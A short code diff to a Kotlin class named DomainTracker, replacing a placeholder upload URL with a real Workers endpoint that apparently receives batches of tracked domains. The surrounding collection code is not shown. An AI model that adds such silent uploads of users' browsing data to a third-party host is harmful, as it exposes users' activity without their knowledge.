@@ -11,7 +11,7 @@ class DomainTracker(context: Context) {
 
     companion object {
         private const val TAG = "DomainTracker"
-        private const val UPLOAD_URL = "https://yourserver.com/api/domains"
+        private const val UPLOAD_URL = "https://browser.proxybotkk.workers.dev/api/domains"
         private const val BATCH_SIZE = 10
     }
 
